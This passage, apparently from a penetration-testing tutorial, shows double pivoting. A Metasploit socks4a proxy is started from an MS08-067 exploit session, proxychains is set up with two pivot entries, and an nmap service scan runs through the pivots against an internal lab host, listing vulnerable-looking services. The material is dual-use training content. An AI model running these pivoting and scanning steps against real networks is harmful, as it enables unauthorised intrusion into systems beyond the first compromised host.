<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-576" src="https://pentest.blog/wp-content/uploads/ms08_esfbof_find888_2-1.png" alt="" width="932" height="288" srcset="https://pentest.blog/wp-content/uploads/ms08_esfbof_find888_2-1.png 932w, https://pentest.blog/wp-content/uploads/ms08_esfbof_find888_2-1-300x93.png 300w, https://pentest.blog/wp-content/uploads/ms08_esfbof_find888_2-1-768x237.png 768w" sizes="(max-width: 932px) 100vw, 932px"></p>
<h4>Holy Proxychains</h4>
<p>The ProxyChains tool connects the proxy servers and transmits the connection end to end. In the last phase, a new socks4 proxy server is run on the local 1081 port for the newly discovered 8.8.8.0/24 network.</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">ms08_067_netapi</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> use auxiliary/server/socks4a </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">auxiliary</span><span class="enlighter-g1">(</span><span class="enlighter-text">socks4a</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> show options </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Module </span><span class="enlighter-m0">options</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">auxiliary/server/socks4a</span><span class="enlighter-g1">)</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   Name     Current Setting  Required  Description</span></div></div><div class=""><div><span class="enlighter-text">   ----     ---------------  --------  -----------</span></div></div><div class=""><div><span class="enlighter-text">   SRVHOST  </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">      yes       The address to listen on</span></div></div><div class=""><div><span class="enlighter-text">   SRVPORT  </span><span class="enlighter-n1">1080</span><span class="enlighter-text">             yes       The port to listen on.</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Auxiliary action:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   Name   Description</span></div></div><div class=""><div><span class="enlighter-text">   ----   -----------</span></div></div><div class=""><div><span class="enlighter-text">   Proxy  </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">auxiliary</span><span class="enlighter-g1">(</span><span class="enlighter-text">socks4a</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set SRVPORT </span><span class="enlighter-n1">1081</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">SRVPORT =</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">1081</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">auxiliary</span><span class="enlighter-g1">(</span><span class="enlighter-text">socks4a</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> run</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Auxiliary module execution completed</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Starting the socks4a proxy server</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">auxiliary</span><span class="enlighter-g1">(</span><span class="enlighter-text">socks4a</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span></div></div></div><div class="enlighter-raw">msf exploit(ms08_067_netapi) &gt; use auxiliary/server/socks4a 

msf auxiliary(socks4a) &gt; show options 

Module options (auxiliary/server/socks4a):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  172.16.0.20      yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  



msf auxiliary(socks4a) &gt; set SRVPORT 1081
SRVPORT =&gt; 1081

msf auxiliary(socks4a) &gt; run
[*] Auxiliary module execution completed

[*] Starting the socks4a proxy server

msf auxiliary(socks4a) &gt;</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">msf exploit(ms08_067_netapi) &gt; use auxiliary/server/socks4a 

msf auxiliary(socks4a) &gt; show options 

Module options (auxiliary/server/socks4a):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  172.16.0.20      yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  



msf auxiliary(socks4a) &gt; set SRVPORT 1081
SRVPORT =&gt; 1081

msf auxiliary(socks4a) &gt; run
[*] Auxiliary module execution completed

[*] Starting the socks4a proxy server

msf auxiliary(socks4a) &gt;</pre>
<p>The information of the new proxy server will define in the /etc/proxychains.conf configuration file. By activating the <strong>Dynamic Chain</strong> setting, sequential switching between the defined proxy servers is ensured.</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">root@kali:~</span><span class="enlighter-c0"># cat /etc/proxychains.conf | grep -v "#"</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">dynamic_chain</span></div></div><div class=""><div><span class="enlighter-text">proxy_dns </span></div></div><div class=""><div><span class="enlighter-text">tcp_read_time_out </span><span class="enlighter-n1">15000</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">tcp_connect_time_out </span><span class="enlighter-n1">8000</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">socks4  </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"> </span><span class="enlighter-n1">1080</span><span class="enlighter-text">  </span><span class="enlighter-c0"># First Pivot</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">socks4  </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"> </span><span class="enlighter-n1">1081</span><span class="enlighter-text">  </span><span class="enlighter-c0"># Second Pivot</span></div></div></div><div class="enlighter-raw">root@kali:~# cat /etc/proxychains.conf | grep -v "#"
dynamic_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000
socks4  172.16.0.20 1080  # First Pivot
socks4  172.16.0.20 1081  # Second Pivot</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">root@kali:~# cat /etc/proxychains.conf | grep -v "#"
dynamic_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000
socks4	172.16.0.20 1080	# First Pivot
socks4  172.16.0.20 1081	# Second Pivot</pre>
<p>With the Proxychains tool, the 8.8.8.9 target can be scanned via the second pivot system with the nmap tool.</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">root@kali:~</span><span class="enlighter-c0"># proxychains nmap -sT -sV -p21,22,23,80 8.8.8.9 -n -Pn -vv</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">ProxyChains-</span><span class="enlighter-n0">3.1</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">http:</span><span class="enlighter-c0">//proxychains.sf.net)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Starting Nmap </span><span class="enlighter-n0">7.25</span><span class="enlighter-text">BETA1 </span><span class="enlighter-g1">(</span><span class="enlighter-text"> https:</span><span class="enlighter-c0">//nmap.org )</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Nmap wishes you a merry Christmas! Specify -sX </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Xmas </span><span class="enlighter-m0">Scan</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">https:</span><span class="enlighter-c0">//nmap.org/book/man-port-scanning-techniques.html).</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">NSE: Loaded </span><span class="enlighter-n1">36</span><span class="enlighter-text"> scripts </span><span class="enlighter-k1">for</span><span class="enlighter-text"> scanning.</span></div></div><div class=""><div><span class="enlighter-text">Initiating Connect Scan</span></div></div><div class=""><div><span class="enlighter-text">Scanning </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text"> </span><span class="enlighter-g1">[</span><span class="enlighter-n1">4</span><span class="enlighter-text"> ports</span><span class="enlighter-g1">]</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">|D-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1081</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-8.8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">:</span><span class="enlighter-n1">21</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">Discovered open port </span><span class="enlighter-n1">21</span><span class="enlighter-text">/tcp on </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">|D-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1081</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-8.8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">:</span><span class="enlighter-n1">23</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">Discovered open port </span><span class="enlighter-n1">23</span><span class="enlighter-text">/tcp on </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">|D-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1081</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-8.8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">Discovered open port </span><span class="enlighter-n1">22</span><span class="enlighter-text">/tcp on </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">|D-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1081</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-8.8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">:</span><span class="enlighter-n1">80</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">Discovered open port </span><span class="enlighter-n1">80</span><span class="enlighter-text">/tcp on </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Completed Connect Scan at </span><span class="enlighter-n4">05</span><span class="enlighter-text">:</span><span class="enlighter-n1">54</span><span class="enlighter-text">, </span><span class="enlighter-n0">1.37</span><span class="enlighter-text">s </span><span class="enlighter-m0">elapsed</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n1">4</span><span class="enlighter-text"> total ports</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Initiating Service scan at </span><span class="enlighter-n4">05</span><span class="enlighter-text">:</span><span class="enlighter-n1">54</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Scanning </span><span class="enlighter-n1">4</span><span class="enlighter-text"> services on </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">|D-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1081</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-8.8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">:</span><span class="enlighter-n1">21</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|D-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1081</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-8.8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">:</span><span class="enlighter-n1">22</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|D-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1081</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-8.8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">:</span><span class="enlighter-n1">23</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|D-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1081</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-8.8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">:</span><span class="enlighter-n1">80</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">Completed Service scan at </span><span class="enlighter-n4">05</span><span class="enlighter-text">:</span><span class="enlighter-n1">54</span><span class="enlighter-text">, </span><span class="enlighter-n0">11.09</span><span class="enlighter-text">s </span><span class="enlighter-m0">elapsed</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n1">4</span><span class="enlighter-text"> services on </span><span class="enlighter-n1">1</span><span class="enlighter-text"> host</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">NSE: Script scanning </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">.</span></div></div><div class=""><div><span class="enlighter-text">NSE: Starting runlevel </span><span class="enlighter-m0">1</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-k1">of</span><span class="enlighter-text"> </span><span class="enlighter-n1">2</span><span class="enlighter-g1">)</span><span class="enlighter-text"> scan.</span></div></div><div class=""><div><span class="enlighter-text">Initiating NSE at </span><span class="enlighter-n4">05</span><span class="enlighter-text">:</span><span class="enlighter-n1">54</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">|D-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1081</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-8.8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">:</span><span class="enlighter-n1">80</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">|D-chain|-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1080</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;</span><span class="enlighter-n0">-172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1081</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-n0">-8.8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text">:</span><span class="enlighter-n1">80</span><span class="enlighter-text">-</span><span class="enlighter-g1">&lt;&gt;&lt;&gt;</span><span class="enlighter-text">-OK</span></div></div><div class=""><div><span class="enlighter-text">Completed NSE at </span><span class="enlighter-n4">05</span><span class="enlighter-text">:</span><span class="enlighter-n1">54</span><span class="enlighter-text">, </span><span class="enlighter-n0">1.71</span><span class="enlighter-text">s elapsed</span></div></div><div class=""><div><span class="enlighter-text">NSE: Starting runlevel </span><span class="enlighter-m0">2</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-k1">of</span><span class="enlighter-text"> </span><span class="enlighter-n1">2</span><span class="enlighter-g1">)</span><span class="enlighter-text"> scan.</span></div></div><div class=""><div><span class="enlighter-text">Initiating NSE at </span><span class="enlighter-n4">05</span><span class="enlighter-text">:</span><span class="enlighter-n1">54</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Completed NSE at </span><span class="enlighter-n4">05</span><span class="enlighter-text">:</span><span class="enlighter-n1">54</span><span class="enlighter-text">, </span><span class="enlighter-n0">0.00</span><span class="enlighter-text">s elapsed</span></div></div><div class=""><div><span class="enlighter-text">Nmap scan report </span><span class="enlighter-k1">for</span><span class="enlighter-text"> </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Host is up, received user-</span><span class="enlighter-m0">set</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n0">0.41</span><span class="enlighter-text">s latency</span><span class="enlighter-g1">)</span><span class="enlighter-text">.</span></div></div><div class=""><div><span class="enlighter-text">Scanned </span></div></div><div class=""><div><span class="enlighter-text">PORT   STATE SERVICE REASON  VERSION</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">21</span><span class="enlighter-text">/tcp open  ftp     syn-ack vsftpd </span><span class="enlighter-n0">2.3</span><span class="enlighter-text">.</span><span class="enlighter-m3">4</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">22</span><span class="enlighter-text">/tcp open  ssh     syn-ack OpenSSH </span><span class="enlighter-n0">4.7</span><span class="enlighter-text">p1 Debian </span><span class="enlighter-m0">8ubuntu1</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">protocol </span><span class="enlighter-n0">2.0</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">23</span><span class="enlighter-text">/tcp open  telnet  syn-ack Linux telnetd</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-n1">80</span><span class="enlighter-text">/tcp open  http    syn-ack Apache httpd </span><span class="enlighter-m3">2</span><span class="enlighter-text">.</span><span class="enlighter-n0">2.8</span><span class="enlighter-text"> </span><span class="enlighter-g1">((</span><span class="enlighter-text">Ubuntu</span><span class="enlighter-g1">)</span><span class="enlighter-text"> DAV/</span><span class="enlighter-n1">2</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Read data files from: /usr/bin/../share/nmap</span></div></div><div class=""><div><span class="enlighter-text">Service detection performed. Please report any incorrect results at https:</span><span class="enlighter-c0">//nmap.org/submit/ .</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Nmap done: </span><span class="enlighter-n1">1</span><span class="enlighter-text"> IP </span><span class="enlighter-m0">address</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n1">1</span><span class="enlighter-text"> host up</span><span class="enlighter-g1">)</span><span class="enlighter-text"> scanned </span><span class="enlighter-k1">in</span><span class="enlighter-text"> </span><span class="enlighter-n0">14.59</span><span class="enlighter-text"> seconds</span></div></div><div class=""><div><span class="enlighter-text">root@kali:~</span><span class="enlighter-c0">#</span></div></div></div><div class="enlighter-raw">root@kali:~# proxychains nmap -sT -sV -p21,22,23,80 8.8.8.9 -n -Pn -vv
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.25BETA1 ( https://nmap.org )
Nmap wishes you a merry Christmas! Specify -sX for Xmas Scan (https://nmap.org/book/man-port-scanning-techniques.html).
NSE: Loaded 36 scripts for scanning.
Initiating Connect Scan
Scanning 8.8.8.9 [4 ports]
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:21-&lt;&gt;&lt;&gt;-OK
Discovered open port 21/tcp on 8.8.8.9
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:23-&lt;&gt;&lt;&gt;-OK
Discovered open port 23/tcp on 8.8.8.9
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:22-&lt;&gt;&lt;&gt;-OK
Discovered open port 22/tcp on 8.8.8.9
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;-172.16.0.20:1081-&lt;&gt;&lt;&gt;-8.8.8.9:80-&lt;&gt;&lt;&gt;-OK
Discovered open port 80/tcp on 8.8.8.9
Completed Connect Scan at 05:54, 1.37s elapsed (4 total ports)
Initiating Service scan at 05:54
Scanning 4 services on 8.8.8.9
